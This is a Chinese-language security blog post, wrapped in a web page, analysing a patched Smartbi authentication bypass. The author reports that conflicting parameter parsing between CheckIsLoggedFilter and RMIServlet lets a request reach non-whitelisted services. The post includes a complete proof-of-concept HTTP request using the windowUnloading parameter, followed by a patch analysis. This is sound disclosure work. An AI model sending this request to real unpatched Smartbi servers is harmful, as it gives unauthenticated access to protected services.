@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 背景五月份给 CNVD 提了个洞，Smartbi 在今天修了，记录下当时挖洞的过程。    2023-07-03 修复登录代码逻辑漏洞。  0x01 漏洞分析Smartbi 针对 RMIServlet 的防护主要是通过 CheckIsLoggedFilter 完成的，整体的校验逻辑为：  获取 className、methodName、params 校验上述参数，判断是否符合预期（在白名">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Smartbi windowUnloading 绕过分析">
+<meta property="og:url" content="https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="___">
+<meta property="og:description" content="0x00 背景五月份给 CNVD 提了个洞，Smartbi 在今天修了，记录下当时挖洞的过程。    2023-07-03 修复登录代码逻辑漏洞。  0x01 漏洞分析Smartbi 针对 RMIServlet 的防护主要是通过 CheckIsLoggedFilter 完成的，整体的校验逻辑为：  获取 className、methodName、params 校验上述参数，判断是否符合预期（在白名">
+<meta property="og:locale">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703161950030.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162055965.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162117943.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162133949.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703161111494.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162655395.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162842507.jpg">
+<meta property="og:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703163053753.jpg">
+<meta property="article:published_time" content="2023-07-03T12:03:19.000Z">
+<meta property="article:modified_time" content="2023-07-03T12:06:51.956Z">
+<meta property="article:author" content="p1g3">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703161950030.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Smartbi windowUnloading 绕过分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/17/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&text=Smartbi windowUnloading 绕过分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&is_video=false&description=Smartbi windowUnloading 绕过分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smartbi windowUnloading 绕过分析&body=Check out this article: https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&name=Smartbi windowUnloading 绕过分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&t=Smartbi windowUnloading 绕过分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 补丁分析</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Smartbi windowUnloading 绕过分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p1g3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-03T12:03:19.000Z" class="dt-published" itemprop="datePublished">2023-07-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>五月份给 CNVD 提了个洞，Smartbi 在今天修了，记录下当时挖洞的过程。</p>
+<blockquote>
+<p>  2023-07-03 修复登录代码逻辑漏洞。</p>
+</blockquote>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>Smartbi 针对 RMIServlet 的防护主要是通过 CheckIsLoggedFilter 完成的，整体的校验逻辑为：</p>
+<ol>
+<li>获取 className、methodName、params</li>
+<li>校验上述参数，判断是否符合预期（在白名单内）</li>
+</ol>
+<p>Smartbi 会尝试通过多种方式获取并解析这三个参数，下面是解析顺序（上一个解析失败则向下顺延）：</p>
+<ol>
+<li><p>通过 windowUnloading 进行解析</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703161950030.jpg" alt="image-20230703161950030"></p>
+</li>
+<li><p>通过 request.getParameter 进行解析</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162055965.jpg" alt="image-20230703162055965"></p>
+</li>
+<li><p>通过 request body 解析</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162117943.jpg" alt="image-20230703162117943"></p>
+</li>
+<li><p>通过 encode 参数解析</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162133949.jpg" alt="image-20230703162133949"></p>
+</li>
+</ol>
+<p>其中任何一个步骤解析成功了，都不会进行下一个步骤。接下来看看 RMIServlet 是怎么解析的：</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703161111494.jpg" alt="image-20230703161111494"></p>
+<p>这里一共只有三步：</p>
+<ol>
+<li>通过 request.getParameter 解析</li>
+<li>通过文件上传的格式去解析</li>
+<li>通过 request.getAttribute 解析</li>
+</ol>
+<p>从解析流程中不难看出这里存在一个差异绕过的问题，<strong>第一步使用 windowUnloading 对参数进行设置，同时在请求的参数里也进行设置，那么在 CheckIsLoggedFilter 里拿到的就是 windowUnloading 里的参数，而 RMIServlet 拿到的却是请求里的参数。</strong></p>
+<p>构造 POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=className%3DUserService%26methodName%3DautoLoginByPublicUser%26params%3D%5B%5D HTTP/1.1</span><br><span class="line">Host: 192.168.137.131:18080</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://192.168.137.131:18080</span><br><span class="line">Referer: http://192.168.137.131:18080/smartbi/vision/index.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: JSESSIONID=CEA21F9B9E23D9F15CC94B4B01718B5B</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">className=DataSourceService&amp;methodName=testConnectionList&amp;params=%5b%5d</span><br></pre></td></tr></table></figure>
+
+<p>出现 PARAM_COUNT_ERROR 表明已经调用到了恶意 Bean：</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162655395.jpg" alt="image-20230703162655395"></p>
+<h2 id="0x02-补丁分析"><a href="#0x02-补丁分析" class="headerlink" title="0x02 补丁分析"></a>0x02 补丁分析</h2><p>Smartbi 新增了 WindowUnLoadingAndAttributeRule 规则来修补这个漏洞，它会先判断请求中是否存在 windowUnloading 参数，接着判断请求中是否存在 className 和 methodName 等参数，<strong>如果存在，则判断二者解析出来后是否相同</strong>。</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703162842507.jpg" alt="image-20230703162842507"></p>
+<p>漏洞修复后，返回包为 403：</p>
+<p><img src="https://expci.oss-cn-beijing.aliyuncs.com/image-20230703163053753.jpg" alt="image-20230703163053753"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 补丁分析</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&text=Smartbi windowUnloading 绕过分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&is_video=false&description=Smartbi windowUnloading 绕过分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smartbi windowUnloading 绕过分析&body=Check out this article: https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&title=Smartbi windowUnloading 绕过分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&name=Smartbi windowUnloading 绕过分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exp.ci/2023/07/03/Smartbi-windowUnloading%20%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&t=Smartbi windowUnloading 绕过分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p1g3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
